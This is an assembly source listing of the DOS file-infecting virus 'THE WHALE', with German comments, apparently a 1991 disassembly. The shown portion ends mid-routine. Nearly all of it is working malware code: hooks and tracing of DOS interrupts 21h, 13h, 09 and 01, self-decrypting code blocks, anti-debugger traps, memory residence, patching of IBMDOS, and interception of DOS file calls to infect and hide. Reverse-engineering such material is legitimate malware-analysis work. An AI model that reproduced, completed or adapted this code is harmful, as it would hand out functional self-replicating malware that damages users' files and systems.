;=====================================================================
;=====================================================================
;       The WHALE                                                    ;
;                                                                    ;
;       Listing erstellt 1991 , R. Hîrner , Karlsruhe , FRGDR        ;
;                                                                    ;
;=====================================================================
;=====================================================================
code            SEGMENT
                ASSUME  CS:code,DS:code,ES:CODE
                .RADIX 16
                ORG     100h
;---------------------------------------------------------------------
;----------------( Struktur der Entscheidungs-Tabelle fÅr INT 21h )---
;---------------------------------------------------------------------
IF_THEN         STRUC
WENN            DB      ?
DANN            DW      ?
                ENDS
;==========================================( Der Decoder-Aufruf   )===
MDECODE         MACRO   Adr
                CALL    DECODE
                DW      @L&adr-L&Adr
L&Adr:
                ENDM
;==========================================( der Coder-Aufruf     )===
MCODE           MACRO   Adr
                CALL    CODEIT
                DB      @L&Adr-L&Adr+1
@L&Adr:
                ENDM
;---------------------------------------------------------------------
;--------------------------------------------------( fÅr Mutanten )---
L04BB5          EQU     OFFSET D4BB5
J00000          EQU     L04BB5 - Offset Entry
J11111          EQU     L04BB5 - Offset @INT21
ZweiByte        EQU     J00000 / 2
DreiByte        EQU     J00000 / 3
M_Size          EQU     OFFSET J03AD0-OFFSET J03A84
;---------------------------------------------------------------------
;-------------------------------------------( "Mutierende" Makros )---
;---------------------------------------------------------------------
CALL_INT21      MACRO   Adr,adr1                ; Selbst-Relozierend

                DB      0E8H
                DW      - (LL&ADR + J11111 + 1)
LL&ADR          EQU     $-OFFSET ADR1
                ENDM
;---------------------------------------------------------------------
CALL_ENTRY      MACRO   Adr,adr1                ; Selbst-Relozierend
                DB      0E8H
                DW      - (CE&ADR + J00000 )
CE&ADR          EQU     $-OFFSET ADR1
                ENDM
;---------------------------------------------------------------------
JMP_ENTRY       MACRO   Adr,adr1                ; Selbst-Relozierend
                DB      0E9H
                DW      - (JM&ADR + J00000 )
JM&ADR          EQU     $-OFFSET ADR1
                ENDM
;=====================================================================
;===============================================( zur relozierung )===
;=====================================================================
FirstByte       EQU     OFFSET @FirstByte-OFFSET VirStart      ;   20h
CODE_LEN        EQU     OFFSET LASTCODE-OFFSET @FirstByte      ; 2385H
CODE_START      EQU     OFFSET J04BCF - OFFSET @FirstByte      ; 239FH
;=====================================================================
;============================================( verÑnderlicher Code)===
;=====================================================================
SwapCode_1      EQU     Offset Decode - Offset VirStart        ; 0A33h
Swapcode_2      EQU     OFFSET J03A20 - Offset VirStart        ; 1210h
Swapcode_3      EQU     OFFSET J0491A - Offset J03047          ; 18D3h
SwapCode_4      EQU     OFFSET J03047 - Offset VirStart        ; 0837H
SwapCode_5      EQU     OFFSET J03259 - Offset VirStart        ; 0A49h
SwapCode_6      EQU     OFFSET J02CFF - Offset VirStart        ; 04EFh
SwapCode_7      EQU     Offset SwitchByte-Offset VirStart;
SwapCode_8      EQU     Offset Int_02 - Offset VirStart        ; 3181h
;=====================================================================
;========================================( einfacher zu schreiben )===
;=====================================================================
XorByte__1      EQU     OFFSET D_4A5E - Offset VirStart        ; 224Eh
XorByte__2      EQU     OFFSET D_4A79 - Offset VirStart        ; 2269h
;=====================================================================
Part_____1      EQU     OFFSET D4BAC  - OFFSET VirStart        ; 239Ch
Len_Part_1      EQU     OFFSET Lastbyte - Offset D4BAC         ; 0054h
;=====================================================================
SchwimmZiel     EQU     OFFSET J029C1 - Offset VirStart        ; 01B1h
WischeWeg       EQU     OFFSET D4B7C  - Offset VirStart        ; 236Ch
;=====================================================================
SS_INIT         EQU     Offset EXE_SS_INIT-Offset VirStart
SP_INIT         EQU     Offset EXE_SP_INIT-Offset VirStart
CODE_INIT       EQU     Offset EXE_CODE_INIT-Offset VirStart
;=====================================================================
;=============================( Sprungtabelle fÅr Int 21h-Handler )===
;=====================================================================
L0699           EQU     Offset J02ea9 - Offset VirStart
L04f4           EQU     Offset J02D04 - Offset VirStart
L06E0           EQU     Offset J02EF0 - Offset VirStart
L06CA           EQU     Offset J02EDA - Offset VirStart
L08CF           EQU     Offset J030DF - Offset VirStart
L06C8           EQU     Offset J02ED8 - Offset VirStart
L0996           EQU     Offset J031A6 - Offset VirStart
L09E4           EQU     Offset J031F4 - Offset VirStart
L1E5E           EQU     Offset J0466E - Offset VirStart
L1DA2           EQU     Offset J045B2 - Offset VirStart
L0AD4           EQU     Offset J0325D - Offset VirStart
L1F70           EQU     Offset J04780 - Offset VirStart
L1D0F           EQU     Offset J0451F - Offset VirStart
;=====================================================================
;==============================( wenn ein Debugger erkannt wird...)===
;=====================================================================
IfDebugWal      EQU     (Offset J04B6A-Offset CreateTempCode+1) / 2
StartDebug      EQU      Offset CreateTempCode-Offset VirStart
;=====================================================================
;==========================================( ErklÑrung fehlt noch )===
;=====================================================================
@0478           EQU     0478H
@FB88           EQU     10000h-@0478
;=====================================================================
;=================================================( COM-Einsprung )===
;=====================================================================
start:          JMP     ENTRY           ; JMP     Decode_Whale
                DB      00h
Whale_ID        DW      020CCh          ; kennung, da· File infiziert
;=====================================================================
                DB      2300h-6 DUP       (0)
;---------------------------------------------------------------------
;
;       DIESE DATEN WERDEN ZWAR **VOR** DEN CODE
;       ASSEMBLIERT,  ABER ***HINTER*** DEM CODE ABGELEGT !!
;
;       DAS IST DER ***EINZIGE GRUND*** WARUM DIE VIELEN
;       NULL-BYTES VOR DEM WAL STEHEN !!!
;
;       DER CODE IST Code_len BYTE LANG.
;
;       AB OFFSET Code_len DöRFEN ALSO DATEN STEHEN.
;       DESHALB GIBT ES AUCH KEINE DATEN, DIE ***VOR*** DIESEM
;       OFFSET ABGELEGT WERDEN !
;====================================================================
;===========================================( Speichereinteilung )===
;====================================================================
;       Assemblierungszeit :   Zur Laufzeit (resident):
;
;       +-CS:0100=DS:0100-+    +--CS:0000-DS:2810-+  <- Segment 9D90h
;       |                 |    |  Code            |
;       |    Leer         |    |                  |
;       |                 |    |                  |
;       +-CS:2400=DS:2400-+    +--CS:2400-DS:4C10-+ (DS:4C43=CS:2433!)
;       |    Daten        |    |  DATEN           |
;       +-CS:2700=DS:2700-+    +--CS:2700-DS:4F10-+  <--Speicherbedarf
;       |    Leer         |    |  Grafikkarte     |  incl. Zugriff auf
;       +-CS:2800=DS:2800-+    |                  |      residenten
;       | Save-Daten+Code |    |                  |     COMMAND.COM
;       +-CS:2810=DS:2810-+    |                  |
;       |                 |    |                  |
;       |    Code         |    |                  |
;       |                 |    |                  |
;       +-CS:4c00=DS:4C00-+    +------------------+
;
;---------------------------------------------------------------------
OFFSET_2400:
CodBuf          DB      1Ch DUP (?)     ; Wirts-File-Beginn / Puffer
;---------------------------------------------------------------------
D241C           DB      ?
D241D           DB      ?
D241E           DW      ?
D2420           DW      ?
D2422           DW      ?
D2424           DD      ?               ; Adresse des exec-param-blocks
D2428           DB      ?               ; Drive des aktuellen Files
FileTime        DW      ?               ; File-Uhrzeit
FileDate        DW      ?               ; File-Datum
Trace_Adres     DD      ?               ; Temp-DD fÅr Trace-Adresse
D2431           DW      ?
D2433           DB      ?       ; "1" : Nach Verschluesselung INT 21h
                                ; ausfÅhren und wieder Entschluesseln.
D2434           DB      ?
Low_INT_21H     DD      ?               ; IBMDOS-Adresse INT 21h
@Int_13h        DD      ?               ; Adresse INT 13h
D243D           DD      ?               ; Adresse INT 24H
PSP_SEG         DW      ?               ; PSP-SEGMENT
D2443           DW      ?
D2445           DW      ?
D2447           DW      ?               ; Erster MCB / Tracesegment
D2449           DW      ?
;---------------------------------------------------------------------
;--------------------------------------------( wird "JMP CS:2256" )---
;--------------------------------------------( also "JMP VirInt21")---
D244B           DB      ?
D244C           DW      ?
D244E           DW      ?
;---------------------------------------------------------------------
D2450           DW      ?               ; Trace-Kontrollwort
D2452           DW      14h     DUP (?)
D247A           DW      14h     DUP (?)
D24A2           DB      ?               ;
@PSP            DW      ?               ; Aktuelles PSP-Segment
FilePos         DD      ?               ; File-Pos
FileSize        DD      ?               ; File-Size
D24AD           DW      ?               ; Offset des Caller-Lese-Puffers
D24AF           DW      ?               ; Anzahl der zu lesenden Byte
D24B1           DW      ?
D24B3           DW      ?               ; CALLERS - Flags !
D24B5:
@FCB            DB      25h     DUP (?) ; FCB
Error           DB      ?               ; ERROR aufgetreten ; 24DA
D24DB           DW      ?
D24DD           DW      ?               ; PLatz fÅr SS
D24DF           DW      ?               ; Platz fÅr SP
D24E1           DW      ?
D24E3           DW      ?               ; Platz fÅr AX
D24E4           DW      ?
;---------------------------------------------------------------------
D24E6           DW      ?               ; Caller-IP ?
D24E8           DW      ?               ; Caller-CS ?
D24EA           DW      ?               ; Returnadresse zwischen Push/Pop
D24EC           DW      ?               ;
D24EE           DB      ?
D24EF           DB      ?
;---------------------------------------------------------------------
D24F0           DB      ?
EPB             DB      ?               ; Start EPB
D24F2           DW      ?               ; File-Attribut
D24F4           DW      ?               ; Offset Filename / ASCIIZ
D24F6           DW      ?               ; Segment Filename / ASCIIZ
D24F8           DW      ?               ;
D24FA           DW      ?               ;
D24FC           DW      ?
D24FE           DB      ?
;---------------------------------------------------------------------
D24FF           DW      ?               ; SP-init
D2501           DW      ?               ; SS-init
D2503           DW      ?               ; IP-init
D2505           DW      ?               ; CS-init
;---------------------------------------------------------------------
Cmd_Line        DB      50H dup (?)     ; command-line
;---------------------------------------------------------------------
D2557           DW      ?               ; Orig.SP
D2559           DW      ?               ; Orig.SS
Vir_SP          DW      ?               ; Vir. SP
D245D           DW      ?
D245F           DB      ?
D2560           DW      ?               ; Platz fÅr AX
D2562           DW      ?               ; Platz fÅr BX
D2564           DW      ?               ; Platz fÅr CX
;-------------------------------( als virtuelle Code-Area genutzt )---
@INT21          DD      ?               ; ADRESSE Original INT 21H
D256A           DW      ?
D256C           DW      ?
D256E           DW      ?
;-------------------------------------------( wird "JMP CS:2273"  )---
;-------------------------------------------( also "JMP VirInt09" )---
D2570           DB      ?
D2571           DW      ?
D2573           DW      ?
;---------------------------------------------------------------------
D2575           DW      ?               ; SAVE SI
D2577           DW      ?               ; SAVE DI
D2579           DW      ?               ; SAVE AX
D257B           DW      ?               ; SAVE DS
D257D           DW      ?               ; SAVE ES
D257F           DW      ?               ; SAVE CX
;---------------------------------------------------------------------
D2581           DW      ?               ; SAVE BX
INT_09          DD      ?               ; Original INT 09
D2587           DB      ?               ; wird bei J02975 geschrieben
D2588           DW      ?
D258A           DW      ?
InfectFlag      DB      ?               ; "1" nach der ersten Infektion
D258D           DB      ?
D258E           DW      ?               ; Platz fÅr Flags
;---------------------------------------------------------------------
D2590           DW      ?               ; SAVE DX
@INT02          DD      ?               ; Originaler INT 02
TrashFlag       DB      ?               ; "1" : Statt einer Infektion,
                                        ;     wird Trash weggeschrieben
D2597           DB      ?
D2598           DW      ?               ; hier kommt z.B. "HLT" hin...
D259A           DW      ?               ;
;---------------------------------------------------------------------
D259C           DD      ?
D25A0           DB      160h DUP (0)

D2700:          ; VIRUS-STACK -^^^
;---------------------------------------------------------------------
                DB      100 DUP (0)
J02801:         DB      0
J02802:         DB      0
J02803:         DB      0
J02804:         DB      0
J02805:         DB      0
J02806:         DB      0
J02807:         DB      0
;---------------------------------------------------------------------
J02808:                 MOV     AH,4Ch          ; main() :-)))
                        MOV     AL,[ErrorCode]
                        INT     21
ErrorCode               DB      00h
;---------------------------------------------------------------------
;       Hier beginnt WHALE
;---------------------------------------------------------------------
VIRSTART:               DB      00h             ;02810
J02811:                 JMP     Decode_Whale
;=====================================================================
;======( Puffer fÅr die ersten 1Ch Byte des infizierten Programmes)===
;=====================================================================
EXE_ID:                 DW      04CB4H          ; 'MZ'      / MOV AH,4C
EXE_LastBytes:          DW      021CDH          ; Lastbytes / INT 21
EXE_Pages:              DW      0               ; Pages
EXE_Rel_Count           DW      0               ; Reloc-Count
EXE_Paras:              DW      0               ; Headerpara
EXE_MinFree:            DW      0               ; minfree
EXE_MaxFree:            DW      0               ; maxfree
EXE_SS_INIT:            DW      0               ; ss-init
EXE_SP_INIT:            DW      0               ; sp-init
EXE_ByteSum:            DW      0               ; bytesum
EXE_CODE_INIT:          DD      0               ; ip-init, cs-init
EXE_Reloc_Ofs:          Dw      0               ; reloc-offset
EXE_Ovl_Num:            DW      0               ; ovl-num
;---------------------------------------------------------------------
@FIRSTBYTE:      ;<----------------( erstes Byte im oberen Segment )---
EXE_FLAG                DB      0               ; "1" : EXE-FILE
;=====================================================================
;==================================( erster CALL nach Dekodierung )===
;==================================( 'echter' Einsprung           )===
;=====================================================================
Offset_2831:
ENTRY:          CALL    J0288E
;---------------------------------------------------------------------
Vir_NAME:       DB      "THE WHALE"
;---------------------------------------------------------------------
                DB      0ffh
                db      036h
                db      0c7h
;----------------------------------------------------------(trash?)---
                PUSH    ES
J02842:         PUSH    BX
                INC     WORD Ptr DS:[0458h]     ; evtl Cursor-Loc auf
                JNZ     J0284C                  ; page 5 (??!??)
                JMP     J02A4F                  ; -> Nirwana
;====================================================()===============
J0284C:         MOV     AX,CS:[BX]
                ADD     BX,+02h

J02852:         JZ      J0287E                  ; = RET nach altem BX
                ADD     CS:[BX],AX
                LOOP    J0284C
                POP     BX
                DB      9fh,06h
;=====================================================================
;==================( folgender Code wird an Adresse 2566h erzeugt )===
;=====================================================================
;@INT21:        DW      2568h           ; fÅr "call word ptr [@int21]"
;D2568:         PUSHF
;               CALL    FAR CS:[Low_INT_21H]  ; CALL OLD INT 21
;               RET
;---------------------------------------------------------------------
CreateTempCode: MOV     Word Ptr DS:[@INT21  ],Offset @INT21+2
                POP     BX
                MOV     WORD Ptr DS:[@INT21+2],2E9Ch
                ADD     BX,+02h                 ; SIC !
                MOV     WORD Ptr DS:[D256A],1EFFh
                MOV     WORD Ptr DS:[D256C],OFFSET Low_INT_21H
                PUSH    BX
                MOV     WORD Ptr DS:[D256E],00C3h
J0287E  EQU     $-1                             ; zeigt auf "RET"
                MOV     WORD Ptr DS:[Vir_SP],2700h
EIN_RETURN:     RETN                            ; RETURN 2 Byte weiter
;=====================================================================
;---------------------------------------------------------( Trash )---
J02887:         PUSH    CX
                MOV     CX,CS:[BX]
                DB      2eh,8bh,1Eh
;=====================================================================
;====================================( Teil-Initialisierung von SI)===
;====================================( IRET fÅhrt nach J02983     )===
;====================================( Wird als erstes ausgefÅhrt )===
;=====================================================================
J0288E:         POP     BX
                ADD     BX,OFFSET J02983-Offset Vir_NAME
                PUSHF
                PUSH    CS
                PUSH    BX
                MOV     SI,BX                   ; BX = SI = 2983h
                IRET
;---------------------------------------------------------( Trash )---
                DB      0E9h,031h,002h,0ffh,0b4h,029h
                DB      001h,059h,02eh,0ffh,007h,02eh
                DB      023h,037h,05fh,0f3h,0a4h,0EBh
;====================================================================
J028AB:         PUSH    DS                ; altes DS auf Stack
                PUSH    CS
                POP     DS
                CALL    CreateTempCode    ; Return ist 1 word weiter !
                ;--------------
                DW      58EAh
                ;--------------
;=====================================================================
;==================================================( Code-Patcher )===
;=====================================================================
;       BX zeigt auf J03047
;       aus     "CMP BX,SI"
;       wird
;       J03074: XOR     CS:[SI],BX
;               NOP
;               RET
;---------------------------------------------------------------------
;
J028B3:         MOV     BX,OFFSET J03047-Offset VirStart
                XOR     WORD Ptr DS:[BX],0EF15h
                ADD     BX,+02h
                XOR     WORD Ptr DS:[BX],4568h
                MOV     SI,OFFSET J0491A-OFFSET VirStart
                POP     DS                        ; Altes DS zurÅck
                CALL    PATCH                     ; Gleich ausfÅhren !
;=====================================================================
;======================================( WAL ist jetzt erst scharf)===
;=====================================================================
AFTER_PATCH:    MDECODE  1

                CALL    StopINT_02

                MOV     CS:[D24E3],AX
                MOV     AH,52h                     ; sic !
                MOV     CS:[PSP_SEG],DS
                INT     21
                MOV     AX,ES:[BX-02h]             ; Hole ersten MCB !
                MOV     CS:[D2447],AX
                PUSH    CS
                POP     DS
 
                MOV     AL,21h
                CALL    GetInt_AL

                MOV     WORD PTR DS:[Trace_Adres+2],ES   ; Get INT 21h
                MOV     WORD PTR DS:[Trace_Adres  ],BX

                MOV     DX,Offset Int_01_entry-Offset VirStart
                MOV     AL,01h
                MOV     BYTE Ptr DS:[D2450],00h    ; keinen Åbergehen
                CALL    SetInt_AL                  ; SET INT 01
                MCODE   1
;=====================================================================
;===================================================(TRACE INT 21h)===
;=====================================================================
                MDECODE  2
                ;-----------------------------
                PUSHF
                POP     AX
                OR      AX,0100h                ; Tf ein
                PUSH    AX
                POPF
                ;-----------------------------
                PUSHF
                MOV     AH,61h
                CALL    DWORD PTR DS:[Trace_Adres]; TRACE INT 21
                ;-----------------------------
                PUSHF
                POP     AX
                AND     AX,0FEFFh                ; TF aus
                PUSH    AX
                POPF
                ;-----------------------------
                LES     DI,DWORD PTR DS:[Trace_Adres] ; Old int 21h
                ;-----------------------------
                ; Erzeugt JMP CS:2256/J04A66
                ;-----------------------------
                MOV     WORD PTR DS:[Low_INT_21H+2],ES
                MOV     BYTE Ptr DS:[D244B        ],0EAh
                MOV     WORD Ptr DS:[D244C        ],2256h
                MOV     WORD PTR DS:[Low_INT_21H  ],DI
                MOV     WORD PTR DS:[D244E        ],CS
                ;-----------------------------
                CALL    J0298D
                CALL    Patch_IBMDOS
                MCODE   2
                CALL    Wal_Ins_MEMTOP_Kopieren
;=====================================================================
                ; Wal entschwindet zur Speicherobergrenze, husch .....
;#####################################################################
;
;#####################################################################
;=====================================================================
;====================================( PATCHT INT 09-Verarbeitung )===
;=====================================================================
INT_09_Patch:   MDECODE 3
                PUSH    BX
                PUSH    ES
 
                MOV     AL,09h                    ; GET INT 09
                CALL    GetInt_AL

                MOV     WORD PTR CS:[INT_09+2],ES
                MOV     WORD PTR CS:[INT_09  ],BX

                MOV     BYTE PTR CS:[D2570],0EAh  ; PATCHE "JMP CS:2273"
                MOV     WORD PTR CS:[D2573],CS    ; INS SCRATCHPAD
                MOV     WORD PTR CS:[D2571],Offset J04A83-Offset VirStart
                                                  ; = JMP CS:4A83

                CALL    Patch_INT_09
                POP     ES
                POP     BX
J02975:         MOV     BYTE PTR CS:[D2587],00h

                MCODE   3
                RETN
;------------------------------
                DW      027E9H
                DW      0EA1Ah
;=====================================================================
;============================================( Get Virstart in SI )===
;=====================================================================
J02983:         SUB     SI,OFFSET J02983 - Offset VirStart
                JMP     J02F15                  ; SI ist jetzt 2810h
;=====================================================================
                DB      089h,0F3h,0E8H
;=====================================================================
;=========================================( Get INT 2F and INT 13 )===
;=====================================================================
J0298D:         MDECODE 4

                MOV     AL,2Fh                  ; GET INT 2F
                CALL    GetInt_AL

                MOV     BX,ES
                CMP     CS:[D2447],BX
                JNB     J029BC

                CALL    Trace_int_13h

                MOV     DS,WORD PTR CS:[Trace_Adres+2]
                PUSH    WORD PTR    CS:[Trace_Adres  ]
                POP     DX                      ; DS:DX

                MOV     AL,13h
                CALL    SetInt_AL               ; SET INT 13

                XOR     BX,BX
                MOV     DS,BX                   ; DS = 0
                MOV     BYTE Ptr DS:[0475h],02h ; Number of Hard-Drives

J029BC:         MCODE   4
                RETN
;=====================================================================
;==========================( Erste Routine, die im Oberen Speicher)===
;==========================( ausgefÅhrt wird.                     )===
;==========================( AB JETZT ist Offset 2810h = OFFSET 0 )===
;=====================================================================
J029C1:         MDECODE 5
                CALL    Patch_IBMDOS    ; Original wiederherstellen
                MOV     CS:[D244E],CS   ; JMP CS:2256 korrigieren..
                                        ; ist jetzt bei 4A66 ...
                CALL    Patch_IBMDOS    ; und wieder Patchen

                PUSH    CS
                POP     DS
                PUSH    DS
                POP     ES              ; ES=DS=CS
                CALL    INT_09_Patch    ; Patche INT 09

                MOV     BYTE Ptr DS:[InfectFlag],00h
                CALL    Re_SET_Int_02

                MOV     AX,[PSP_SEG]
                MOV     ES,AX
                LDS     DX,ES:[000Ah]   ; INT 22h in DS:DX
                MOV     DS,AX
                ADD     AX,0010h
                ADD     CS:[OFFSET EXE_Reloc_Ofs-Offset VirStart],AX

                CMP     BYTE PTR CS:[OFFSET EXE_FLAG-OFFSET VIRSTART],00h
                                        ; IST ES EIN EXE ??
                STI
                MCODE   5
                JNZ     J02A2E
;=====================================================================
;================================( restore Code-Start im alten CS )===
;=====================================================================
                MDECODE 6
                MOV     AX,CS:[Offset EXE_ID-Offset VirStart  ]
                MOV     WORD PTR DS:[0100h],AX
                MOV     AX,CS:[Offset EXE_ID-Offset VirStart+2]
                MOV     WORD PTR DS:[0102h],AX
                MOV     AX,CS:[Offset EXE_ID-Offset VirStart+4]
                MOV     WORD PTR DS:[0104h],AX

                PUSH    CS:[PSP_SEG]    ; PUSH Start-Segment
                XOR     AX,AX
                INC     AH
                PUSH    AX              ; AX = 100h
                MOV     AX,CS:[D24E3]
                MCODE   6
                RETF                ; == JMP PSP_SEG:100H == COM-START
;=====================================================================
;=============================================( JMP zum EXE-Start )===
;=====================================================================
J02A2E:         MDECODE 7
                ADD     CS:[SS_INIT],AX
                MOV     AX,CS:[D24E3]
                MOV     SP,CS:[SP_INIT]
J02A41:         MOV     SS,CS:[SS_INIT]
                MCODE   7
                JMP     DWORD PTR CS:[CODE_INIT]
;=========================================================(trash !)===
J02A4F:         PUSH    AX
                MOV     AX,0000h
                MOV     DS,AX
                POP     AX
                MOV     BX,Word ptr CS:[06C7h]          ; CS:2ED7 = E3CB
                MOV     Word Ptr DS:[000CH],BX          ; INT 3 setzen !
                MOV     Word Ptr DS:[000EH],CS
                DB      0E8h                            ; CALL 5DBA ?!?
;=====================================================================
;==============================================( TRACE-ROUTINE )======
;=====================================================================
J02A63:         PUSH    BP
                XOR     BX,BX
                MOV     BP,SP
                MOV     DS,BX
                AND     WORD Ptr [BP+06h  ],0FEFFh ; ? Change Flags ?
                MOV     Word Ptr DS:[0004h],AX
                MOV     Word Ptr DS:[000Eh],CS   ; SET INT 3 SEGMENT
                MOV     Word Ptr DS:[000Ch],SI   ; SET INT 3 OFFSET
                CALL    J02CD8                   ; Kein Return, sondern
                                                 ; sowas wie 'IRET'
;=====================================================================
J02A7D:
;======================================================( Trash ???)===
        DB      0E9h,0f2h,0eh
        DB      0BEh                             ;02A80
        DB      0BBh                             ;02A81
        DB      0ABh                             ;02A82
        DB      0EBh                             ;02A83
        DB      0EFh                             ;02A84
        DB      0AFh                             ;02A85
        DB      0BBh                             ;02A86
        DB      0EFh                             ;02A87
        DB       2 DUP (0ABh)                    ;02A88
        DB       2 DUP (0BFh)                    ;02A8A
        DB      0EFh                             ;02A8C
        DB      0ABh                             ;02A8D
        DB      0EBh                             ;02A8E
        DB       2 DUP (0ABh)                    ;02A8F
        DB      0BFh                             ;02A91
        DB      0EBh                             ;02A92
        DB      0EFh                             ;02A93
        DB      0EBh                             ;02A94
        DB       2 DUP (0ABh)                    ;02A95
        DB      0FBh                             ;02A97
        DB      0ABh                             ;02A98
        DB      0EBh                             ;02A99
        DB      0BFh                             ;02A9A
        DB      0BBh                             ;02A9B
        DB      0BFh                             ;02A9C
        DB      0ABh                             ;02A9D
        DB      0EBh,2Eh,80h,0fh
        DB      0abh,0e2h,0f9h
;=====================================================================
;---( Hier wird der Code neu reloziert, so da· Virstart zum       )---
;---( Offset 0 wird. Dazu wird das neue Codesegment errechnet und )---
;---( spÑter Åber RETF angesprungen. Die Routine muss ausgefÅhrt  )---
;---( werden, bevor der Code scharf gemacht wird. Der Patcher     )---
;---( geht vom neuen Codesegment aus.                             )---
;=====================================================================
Relokator:      CALL    DecodeFollowingCode
J02AA8:         xor     sp,sp     ; Stack verwerfen !
                call    L2AAD
L2AAD:          mov     bp,ax     ; AX = 0
                mov     ax,cs
                mov     bx,0010H
                mul     bx        ; AX = CS * 16
                pop     cx        ; CX = Offset L2AAD
                sub     cx,OFFSET L2AAD-OFFSET VIRSTART
                                  ; CX = Offset L2AAD - 29D
                                  ;    = Offset VirStart = 2810h
                add     ax,cx     ; DX:AX := CS*10+2810
                adc     dx,0000   ;
                div     bx        ; DX:AX := CS+281
                push    ax        ; Ergebnis auf Stack,
                                  ; (== Segment Returnadresse )
                mov     ax,Offset J028AB-Offset VirStart
                                  ; Offset Returnadresse ; (CS+281h):09Bh

                push    ax
                mov     ax,bp     ; AX = 0
                call    VersteckeCodeWieder
J02ACC:         retf              ; RETURN nach CS:28AB, immer !
;===========================================================(trash)===
J02ACD:         DB      0B4h,03         ; MOV     AH,03h
                DB      8bh,0D8h        ; MOV     BX,AX
                DB      0E9H            ; JMP     J02BBC
;=====================================================================
;=============================================( Setzen von INT 01 )===
;=====================================================================
J02AD2:         CALL    J02AD5
J02AD5:         POP     BX                      ; BX = 2AD5
                SUB     BX,OFFSET J02AD5-OFFSET J02A63
                                                ; BX = 2A63
                PUSH    BX                      ;
                POP     WORD PTR DS:[0004h]     ; INT 01 Offset = 2A63
                PUSH    CS
                POP     WORD PTR DS:[0006h]     ; INT 01 Segment= CS
                PUSH    CS
J02AE4:         POP     AX
                OR      AX,0F346h               ; SET TF
                PUSH    AX
                POPF

J02AEA:         XLAT                            ; MOV AL,[BX+AL]
                MOV     BH,AL                   ; MOV AL,[2AA9+x]
                ADD     BX,CX
J02AEF:         JMP     J047B1
;=========================================================( trash )===
                MOV     AX,[BX   ]
                MOV     BX,[BX+SI]
                XOR     AX,AX
                MOV     DS,AX
                JMP     J02AE4
;=====================================================================
;==========================( wird von INT 3 / INT 21h angesprungen)===
;=====================================================================
J02AFB:         MDECODE 8
                push    bx
                mov     bx,sp
                mov     bx,ss:[bx+06]   ; HOLE Flags vom Caller-Stack
                mov     cs:[D24B3],bx   ; und merke sie
                pop     bx

                push    bp              ; BP bleibt auf Stack
                mov     bp,sp
                call    StopINT_02
                call    SaveRegisters
                call    Patch_IBMDOS
                call    GetRegsFromVirStack
                call    PUSHALL
                MCODE   8
;=====================================================================
;=====================( sucht zu Wert in AL den passenden Handler )===
;=====================================================================
GetHandler:     MDECODE 9
                CALL    PushALL
                MOV     WORD PTR CS:[D2598],OFFSET J02B8B-Offset VirStart
                MOV     BX,Offset J02B45-Offset VirStart
                MOV     CX,000Fh
J02B38:         CMP     CS:[BX],AH
                JZ      J02B72
                ADD     BX,+03h
                LOOP    J02B38
                JMP     J02B7B
;=====================================================================
J02B45:         ;=================================( Tabelle )=========
                if_then    <00fh,L0699>   ; 2EA9  ; open FCB
                if_then    <011h,L04F4>   ; 2D04  ; Findfirst FCB
                if_then    <012h,L04F4>   ;       ; Findnext  FCB
                if_then    <014h,L06E0>   ; 2EF0  ; Read Seq. FCB
                if_then    <021h,L06CA>   ; 2EDA  ; Read Random FCB
                if_then    <023h,L08CF>   ; 30DF  ; Get Filesize FCB
                if_then    <027h,L06C8>   ; 2ED8  ; Read Rndm Block FCB
                if_then    <03dh,L0996>   ; 31A6  ; OPEN FILE / HANDLE
                if_then    <03eh,L09E4>   ; 31F4  ; CLOSE File / Handle
                if_then    <03fh,L1E5E>   ; 466E  ; READ File / Handle
                if_then    <042h,L1DA2>   ; 45B2  ; SEEK / Handle
                if_then    <04Bh,L0AD4>   ; 325D  ; EXEC
                if_then    <04Eh,L1F70>   ; 4780  ; FindFirst ASCIIZ
                if_then    <04Fh,L1F70>   ; 4780  ; FindNext  ASCIIZ
                if_then    <057h,L1D0F>   ; 451F  ; Set/Get Filedate
;=====================================================================
J02B72:         INC     BX
                PUSH    CS:[BX   ]
                POP     CS:[D2598]      ; Adresse in D2598
J02B7B:         CALL    PopALL
J02B7E:         MCODE 9
                JMP     CS:[D2598]      ; Springe zu [2598]
;================================================================()===
J02B87:         PUSH    SI              ; ?!?!?!
                JMP     J0491B

;=====================================================================
;==========================================( Low-INT-21h aufrufen )===
;=====================================================================
J02B8B:         JMP     J048F3
;=========================================================( trash )===
                DB      043h,041h,031h,00fh,039h,00fh,077h
;=====================================================================
;================================================( Beendet Int21h )===
;=====================================================================
IRET_Int21h:    MDECODE 10
                CALL    SaveRegisters
                CALL    Patch_IBMDOS
                CALL    GetRegsFromVirStack
J02BA3:         MOV     BP,SP
                PUSH    CS:[D24B3]              ; PUSH Flags nach IRET
                POP     [BP+06]                 ; POP  Flags ---"----
                POP     BP
                CALL    Re_SET_Int_02
                MCODE   10
                IRET
;=====================================================================
J02BB6:         DB      0D7h,03Ch,0FFh,075h
;=====================================================================
;=============================================( Pop alle Register )===
;=====================================================================
; ---------------- hilfsweise eingefÅgt :
;       J02BB6: XLAT
;               CMP     AL,0FFh
;               JZ      J02BA3
;               XCHG    AL,BYTE PTR DS:[0C912H] ; MUELL !!!
;               JMP     J02BBF
; ---------------- hilfsweise eingefÅgt :
;       J02BBC: PUSH    ES
;               ADC     CL,CL
;               JMP     J02BBF
; ---------------- Ende einfÅgung
;=====================================================================
;=============================================( Pop alle Register )===
;=====================================================================
J02BBC  EQU     $+2
PopALL:         MDECODE 11
J02BBF:         POP     CS:[D24EA]
                POP     ES
                POP     DS
                POP     DI
                POP     SI
                POP     DX
                POP     CX
                POP     BX
                POP     AX
                POPF
                MCODE   11
                JMP     CS:[D24EA]
;=====================================================================
                DB      0F6h
;=====================================================================
;==========================( Holt alle Register aus dem Vir-Stack )===
;=====================================================================
GetRegsFromVirstack:
                MDECODE 12
                MOV     Word Ptr CS:[D2557],SP
                MOV     Word Ptr CS:[D2559],SS
                PUSH    CS
                POP     SS
                MOV     SP,Word Ptr CS:[Vir_SP]

                CALL    CS:PopALL

                MOV     SS,Word Ptr CS:[D2559]
                MOV     Word Ptr CS:[Vir_SP],SP
                MOV     SP,Word Ptr CS:[D2557]
                MCODE   12
                RETN
;=====================================================================
                DB      0BEh                            ;02C05
                DB      0AFh                            ;02C06
                DB      "4"                             ;02C07
                DB      0Eh                             ;02C08
                DB      "[SZR"                          ;02C09
                DB      8Fh                             ;02C0D
                DB      06h                             ;02C0E
;=====================================================================
;========( 2c0f )=======================( Patcht INT 21 in IBMDOS )===
;=====================================================================
Patch_IBMDOS:   MDECODE 13
;---------------------------------------------------------------------
                MOV     SI,Offset D244B
                LES     DI,CS:[Low_INT_21H]
                PUSH    CS
